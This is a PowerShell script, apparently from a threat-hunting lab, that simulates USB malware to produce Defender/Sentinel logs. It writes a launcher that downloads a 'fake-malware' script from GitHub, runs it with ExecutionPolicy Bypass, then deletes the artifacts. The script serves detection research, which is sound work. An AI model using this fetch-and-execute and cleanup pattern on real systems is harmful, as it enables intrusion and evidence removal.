<#
.SYNOPSIS
Simulates USB-based malware execution with realistic user timing and artifact cleanup.

.DESCRIPTION
This PowerShell script:
1. Mounts a simulated USB (via subst).
2. Writes an embedded malicious launcher to the USB.
3. Executes the launcher, which downloads and runs a fake malware payload.
4. Deletes the payload and launcher.
5. Unmounts the USB simulation.

All activity is spaced with delays to generate realistic logs for MDE/Sentinel.

.NOTES
Author: Jason Nguyen / ChatGPT  
Version: 3.2  
Date: 2025-07-02  
GitHub: https://github.com/jason-p-nguyen
#>

# --- CONFIGURATION ---
$usbDrive = "E:"
$usbSimFolder = "C:\SimulatedUSB"
$payloadFolder = "$usbDrive\Payload"
$maliciousLauncherPath = "$payloadFolder\malicious-usb-launcher.ps1"
$fakeMalwareUrl = "https://raw.githubusercontent.com/jason-p-nguyen/threat-hunting-projects/main/usb_malware_execution/scripts/fake-malware.ps1"
$localPayloadPath = "C:\Temp\payload.ps1"
$ErrorActionPreference = "Stop"

function Abort {
    param([string]$msg)
    Write-Error $msg
    exit 1
}

# --- STEP 1: Simulate USB Mount ---
Write-Host "`n[Step 1] Mounting simulated USB ($usbDrive)..." -ForegroundColor Cyan
if (-Not (Test-Path $usbSimFolder)) {
    New-Item -ItemType Directory -Path $usbSimFolder -Force | Out-Null
    Write-Host "Created simulated USB folder: $usbSimFolder"
}
try {
    subst $usbDrive $usbSimFolder
    Start-Sleep -Seconds 5
    if (-Not (Test-Path $usbDrive)) {
        Abort "ERROR: Failed to simulate USB drive $usbDrive."
    }
    Write-Host "Successfully mapped $usbSimFolder to $usbDrive"
} catch {
    Abort "ERROR: USB mount failed. $_"
}

# --- STEP 2: Write Embedded Launcher to USB ---
Write-Host "`n[Step 2] Writing malicious launcher to $maliciousLauncherPath..." -ForegroundColor Cyan
$launcherCode = @'
Start-Sleep -Seconds 5
Write-Host "Downloading fake malware payload..."
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/jason-p-nguyen/threat-hunting-projects/main/usb_malware_execution/scripts/fake-malware.ps1" -OutFile "C:\Temp\payload.ps1"
Start-Sleep -Seconds 5
Write-Host "Running fake malware..."
Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File C:\Temp\payload.ps1"
'@

try {
    if (-Not (Test-Path $payloadFolder)) {
        New-Item -ItemType Directory -Path $payloadFolder -Force | Out-Null
    }
    Set-Content -Path $maliciousLauncherPath -Value $launcherCode -Force
    Write-Host "Launcher script written successfully."
    Start-Sleep -Seconds 10
} catch {
    Abort "ERROR: Failed to write malicious launcher script. $_"
}

# --- STEP 3: Execute Malicious Launcher ---
Write-Host "`n[Step 3] Executing malicious launcher..." -ForegroundColor Cyan
try {
    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$maliciousLauncherPath`"" -Wait
    Write-Host "Malicious launcher executed."
    Start-Sleep -Seconds 15
} catch {
    Abort "ERROR: Failed to run launcher script. $_"
}

# --- STEP 4: Clean Up Artifacts ---
Write-Host "`n[Step 4] Cleaning up artifacts..." -ForegroundColor Cyan
try {
    if (Test-Path $localPayloadPath) {
        Remove-Item -Path $localPayloadPath -Force
        Write-Host "Deleted payload: $localPayloadPath"
    }
    if (Test-Path $maliciousLauncherPath) {
        Remove-Item -Path $maliciousLauncherPath -Force
        Write-Host "Deleted launcher: $maliciousLauncherPath"
    }
    if (Test-Path $payloadFolder) {
        Remove-Item -Path $payloadFolder -Recurse -Force
        Write-Host "Removed payload folder"
    }
    Start-Sleep -Seconds 5
} catch {
    Write-Warning "WARNING: Cleanup encountered an issue. $_"
}

# --- STEP 5: Unmount Simulated USB ---
Write-Host "`n[Step 5] Unmounting USB ($usbDrive)..." -ForegroundColor Cyan
try {
    subst $usbDrive /D
    Write-Host "USB drive $usbDrive unmounted."
} catch {
    Abort "ERROR: Failed to unmount USB drive. $_"
}

Write-Host "`nâœ… USB malware simulation complete." -ForegroundColor Green
